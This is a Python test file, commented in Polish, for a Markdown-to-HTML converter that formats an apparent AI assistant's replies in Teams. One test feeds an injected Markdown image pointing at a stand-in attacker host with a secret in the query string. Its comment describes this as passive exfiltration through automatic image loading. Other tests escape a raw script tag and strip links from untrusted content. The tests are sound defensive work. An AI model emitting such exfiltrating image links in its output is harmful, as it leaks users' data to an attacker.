"""Testy konwersji Markdown→HTML dla egressu drzwi Teams (delegowany).

Czysta funkcja bez sieci: sprawdzamy render podzbioru renderowanego przez Teams
(pogrubienie, kursywa, nagłówki, listy, kod, link), escapowanie surowych znaków oraz
DEGRADACJĘ do zescapowanego tekstu, gdy biblioteka ``markdown-it-py`` jest niedostępna
(egress nie może wywrócić pollera — ADR 0016).
"""

from __future__ import annotations

import sys

from workmate.adapters.inbound.teams_graph.formatting import to_teams_html


def test_bold_becomes_strong():
    assert "<strong>ważne</strong>" in to_teams_html("**ważne**")


def test_italic_becomes_em():
    assert "<em>ukośnie</em>" in to_teams_html("*ukośnie*")


def test_heading_becomes_h_tag():
    assert "<h3>Status</h3>" in to_teams_html("### Status")


def test_unordered_list_becomes_ul_li():
    html = to_teams_html("- alfa\n- beta")
    assert "<ul>" in html
    assert "<li>alfa</li>" in html
    assert "<li>beta</li>" in html


def test_ordered_list_becomes_ol_li():
    html = to_teams_html("1. pierwszy\n2. drugi")
    assert "<ol>" in html
    assert "<li>pierwszy</li>" in html


def test_inline_code_becomes_code():
    assert "<code>save_note</code>" in to_teams_html("`save_note`")


def test_fenced_code_block_becomes_pre_code():
    html = to_teams_html("```\nx = 1\n```")
    assert "<pre>" in html
    assert "<code>" in html
    assert "x = 1" in html


def test_link_becomes_anchor():
    assert '<a href="https://example.pl">tu</a>' in to_teams_html("[tu](https://example.pl)")


def test_raw_angle_and_amp_are_escaped_not_passed_through():
    html = to_teams_html("1 < 2 & 3")
    assert "&lt;" in html
    assert "&amp;" in html
    assert "< 2" not in html  # nie przepuszczamy surowego znaku jako początku tagu


def test_image_markdown_does_not_become_live_img_tag():
    # Bezpieczeństwo: wstrzyknięty obrazek nie może stać się żywym <img src>, który Teams
    # pobrałby AUTOMATYCZNIE przy renderze (pasywna eksfiltracja). Degraduje do linku/tekstu
    # (klik wymagany — a zwykłe URL-e Teams i tak auto-linkuje, więc link nic nie pogarsza).
    html = to_teams_html("![alt](https://atakujacy.example/pixel.png?d=sekret)")
    assert "<img" not in html
    assert "src=" not in html


def test_empty_string_renders_empty():
    assert to_teams_html("") == ""


def test_falls_back_to_escaped_text_when_library_missing(monkeypatch):
    # Wymuś ImportError na `from markdown_it import ...` (None w sys.modules).
    monkeypatch.setitem(sys.modules, "markdown_it", None)

    result = to_teams_html("**b**\n<script>")

    assert "<strong>" not in result  # brak renderu — biblioteki nie ma
    assert "**b**" in result  # znaczniki Markdown zostają dosłownie
    assert "&lt;script&gt;" in result  # surowy HTML zescapowany
    assert "<br>" in result  # nowa linia zamieniona na <br>


# --- czytelność odpowiedzi: tabele, łamanie linii, przekreślenie (2026-08-21) ---


def test_markdown_table_becomes_a_real_table():
    """Tabela z modelu docierała jako JEDEN ``<p>`` pełen kresek i pipe'ów.

    Teams zwija znaki nowej linii wewnątrz akapitu, więc cała tabela lądowała w jednej długiej
    linii — to był główny powód, dla którego wypisy (issue, pliki, grafik) były nieczytelne.
    Render ``<table>`` zmierzony na żywo w wątku kanału 2026-08-21.
    """
    html = to_teams_html("| # | Tytuł |\n|---|---|\n| 77 | Zadanie |")

    assert "<table>" in html and "<th>Tytuł</th>" in html and "<td>77</td>" in html
    assert "|---|" not in html


def test_single_newline_becomes_a_line_break():
    # To jest czat, nie dokument: blok pisany linia-po-linii zwijał się w jedno zdanie ciągiem.
    assert "<br />" in to_teams_html("pierwsza linia\ndruga linia")


def test_strikethrough_becomes_a_tag():
    assert "<s>nieaktualne</s>" in to_teams_html("~~nieaktualne~~")


def test_bare_url_stays_text_because_teams_links_it_itself():
    """Gołych adresów renderer ŚWIADOMIE nie tyka — Teams linkuje je sam.

    Zmierzone na żywo 2026-08-21: goły adres w wiadomości kanału jest klikalny bez naszego
    udziału. Gdyby ktoś mimo to sięgnął po regułę ``linkify``, wymaga ona ``linkify-it-py``,
    którego w obrazie NIE MA — ``enable("linkify")`` bez pakietu RZUCA, a ``to_teams_html``
    degraduje wtedy CAŁY render do zescapowanego tekstu. Ta sonda pilnuje obu rzeczy naraz.
    """
    html = to_teams_html("zobacz https://example/adr-0002")

    assert "<a " not in html
    assert "https://example/adr-0002" in html


def test_untrusted_content_keeps_tables_but_never_live_links():
    # Most (treść z GitHuba) nadal bez żywych linków — anty-phishing (ADR 0016). Tabela
    # jest formatowaniem, nie kanałem wyprowadzenia, więc jej ta bramka nie dotyczy.
    html = to_teams_html("| a |\n|---|\n| [Kliknij](https://atakujacy) |", allow_links=False)

    assert "<table>" in html
    assert "<a " not in html and "atakujacy" in html


def test_conventions_make_the_table_the_default_for_record_lists():
    """Sam renderer nie wystarczy: prompt kazał modelowi robić DOKŁADNIE odwrotnie.

    Poprzednia redakcja brzmiała „bullets for enumerations […] Teams renders dense blocks
    poorly" — więc nawet po włączeniu tabel model dalej sypałby punktorami.
    """
    from workmate.core.agent.prompt import STATIC_PROMPT, STATIC_PROMPT_SHELL

    for prompt in (STATIC_PROMPT, STATIC_PROMPT_SHELL):
        assert "Markdown table" in prompt
        assert "fenced code block" in prompt
